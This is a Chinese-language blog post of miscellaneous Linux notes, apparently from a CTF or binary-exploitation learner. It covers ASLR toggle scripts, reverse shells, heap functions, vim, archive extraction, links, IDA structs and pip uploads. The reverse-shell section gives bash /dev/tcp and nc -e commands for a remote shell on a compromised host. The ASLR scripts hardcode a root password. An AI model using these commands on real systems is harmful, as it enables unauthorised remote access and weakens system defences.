---
layout: post
title: Linux下的一些基础知识小记
category: unsorted
date: 2023-9-18 12:00:00
---
Linux
<!-- more -->
[toc]

# ubuntu下编写快速开启\关闭\查看aslr脚本

由于`suid`不能直接作用于`bash`脚本（为了安全考虑），我们这里采用`expect`脚本的方式。如下所示：

关闭`aslr`：

```bash
#!/usr/bin/expect
spawn su root
expect "Password: "
send "your_password\r"
send "echo 0 > /proc/sys/kernel/randomize_va_space\r"
send "exit\r"
expect eof
send_user "\n"
```

将这个脚本放在`/usr/bin`中，给予执行权限即可。

同理，开启`aslr`的脚本如下：

```bash
#!/usr/bin/expect
spawn su root
expect "Password: "
send "your_password\r"
send "echo 2 > /proc/sys/kernel/randomize_va_space\r"
send "exit\r"
expect eof
send_user "\n"
```

查看`aslr`状态：

```bash
#!/usr/bin/expect
spawn su root
expect "Password: "
send "your_password\r"
send "cat /proc/sys/kernel/randomize_va_space\r"
send "exit\r"
expect eof
send_user "\n"
```

# 反弹shell

若要从主机`A`接收一个反弹的`shell`，首先在主机上监听某个端口：

```bash
nc -l 8080
```

通过在主机`B`上执行如下命令，即可使得主机`B`主动发起一个连接到主机`A`。

```bash
bash -i >& /dev/tcp/主机A的IP/主机A监听的端口 0>&1
# 或者nc -e /bin/bash 计算机A的IP 计算机A监听的端口
# 但某些版本的nc不支持-e参数
```

“反弹”`shell`的意思就是，这个`shell`是由主机`B`主动发起连接让主机`A`使用主机`B`的`shell`的，因此不会被防火墙等阻拦。若我们能通过木马等方式控制某台主机并执行一次命令，那么我们即可反弹一个`shell`。

# 常见函数

## setvbuf函数

```c
setvbuf(steam, buf, mode, size);
// setvbuf可以设置文件流的缓冲模式。
// stream表示设置哪一个流，例如stdin、stdout
// buf表示自定义缓冲区的位置，设置为0表示不要自定义缓冲区而是C语言分配
// mode分为三种，全缓冲_IOFBF为0， _IOLBF为1，_IONBF为2
// size表示缓冲区大小，若缓冲区是C语言分配，则该值设置为缓冲区大小。若缓冲区是自定义的，该值需要与自定义缓冲区相匹配。
// setvbuf(stdin, 0, 2, 0);表示将stdin设置为无缓冲模式
```

## calloc函数

```c
calloc(num_elements, element_size);
// calloc函数可以动态分配内存，且分配的区域会自动初始化为0
// calloc函数不会申请到tcache中的内存空间
// num_elemtents表示要分配的元素数量
// element_size表示每个元素的大小（单位是字节）
// 实际申请的内存空间为num_elements * element_size（不加header）
```

## realloc函数

```c
realloc(ptr, new_size);
// realloc函数可以重新调整之前分配的内存块的大小。
// 若ptr为0且new_size > 0，则相当于malloc(new_size)
// 若new_size为0，则会将ptr进行free
// 若new_size非法，则会return NULL
// 若new_size < old_size - 0x20，则会chunk shrink，多余的部分会直接free
// 若new_size > old_size，高地址处的chunk为top chunk则直接扩展；高地址处为free状态的chunk，则需要后面free的chunk合并，判断切割后能否满足，否则直接申请新的chunk，复制到新的chunk中，将以前的chunk进行free
```

# Linux查找文件

```bash
find /etc -name "php.ini"
```

# VIM操作

回到顶部

```bash
gg
```

删除当前以下所有

```bash
dG
```

查找内容

```bash
/ # 唤起查找，输入完成后回车
n # 前向查找
N # 反向查找
```

# vmware共享文件夹

我现在设置到了主机桌面的`vmware_share`

在`ubuntu`下是在`/mnt/hgfs/vmware_share`

# ubuntu解压缩

```bash
tar –xvf file.tar //解压 tar包

tar -xzvf file.tar.gz //解压tar.gz

tar -xjvf file.tar.bz2   //解压 tar.bz2

tar –xZvf file.tar.Z   //解压tar.Z

unrar e file.rar //解压rar

unzip file.zip //解压zip

总结：

  (1)、*.tar 用 tar –xvf 解压
  (2)、*.gz 用 gzip -d或者gunzip 解压
  (3)、*.tar.gz和*.tgz 用 tar –xzf 解压
  (4)、*.bz2 用 bzip2 -d或者用bunzip2 解压
  (5)、*.tar.bz2用tar –xjf 解压
  (6)、*.Z 用 uncompress 解压
  (7)、*.tar.Z 用tar –xZf 解压
  (8)、*.rar 用 unrar e解压
  (9)、*.zip 用 unzip 解压
```

# 软链接和硬链接

## 软链接

- 可以理解为一个“快捷方式”。
- 原始文件被删除后，软链接将“悬空”，指向不存在的文件。
- 软链接可以链接到目录。
- 软链接不会存储文件内容，而是仅存储原文件的路径。

## 硬链接

- 可以理解为同一个文件的不同名称。
- 原始文件被删除后，硬链接仍然可以访问该文件（你可以把硬链接和原始文件名同等地当作文件的两个名称）。
- 不能链接到目录

```bash
# 创建硬链接
ln source_file hard_link
# 创建软链接
ln -s source_file soft _link
```

# ida创建结构体

在逆向尤其是二进制程序分析时，我们常常会遇到一些结构体，结构体里面还会嵌套一些结构体。有的师傅喜欢人肉反编译，但是这里还是记录一下`ida`如何进行结构体的创建。这里分为两种，一种是`ida`自带的结构体创建和编写C语言代码创建。

**无论使用哪种方式创建了结构体，只需要在`ida`反编译的代码中选中结构体指针变量并右键，点击`conver to struct*`然后选中自己创建的结构体即可让ida应用这种结构体方式。**

## ida自带结构体创建

使用`shift+f9`打开结构体菜单，如图所示：![](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311131305716.png)

此时按下键盘上的`insert`键，输入要创建的结构体名称，如图所示：

![image-20231113130817035](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311131308083.png)

就可以完成空结构体的创建，如图所示：

![image-20231113130844706](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311131308741.png)

现在我们将光标移动到`ends`的一行，按下键盘上的`d`键，即可添加一个结构体的成员变量：

![image-20231113130945752](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311131309786.png)

鼠标移动到默认创建的名称`field_0`上按下键盘上的`n`键可以更改名称，而再次按下键盘上的`d`键可以更改变量的数据类型，如图所示就创建好了一个带有一个8字节大小的叫做`name`的成员变量的结构体：

![image-20231113131104436](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311131311471.png)

## 编写C语言代码创建结构体

假如你觉得上面的方法过于复杂，或者结构体成员变量较多，那么你可以采取直接编写C语言代码的方式来创建结构体。在`ida`中按下`shift+f1`，如图所示：

![image-20231113131420860](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311131314895.png)

我们按下键盘上的`insert`键，即可弹出输入结构体的C语言代码的输入框：

![image-20231113131532298](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311131315342.png)

输入完成后按下`ok`即可完成结构体的创建。无论使用了哪种方式创建结构体，都可以在结构体指针上使用`convert to struct*`来应用结构体。

## 效果演示

如图所示，应用结构体后即可使用结构体的方式在反编译后的代码中显示。

![image-20231113131752853](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311131317899.png)

# 上传包到pip

使用如下命令构建包，会生成文件到`dist`：

```bash
python3 setup.py sdist bdist_wheel
```

使用如下命令上传到`pip`：

```bash
twine upload dist/*
```

会要求输入`API`。若更新，需要更新`setup.py`中的版本号。
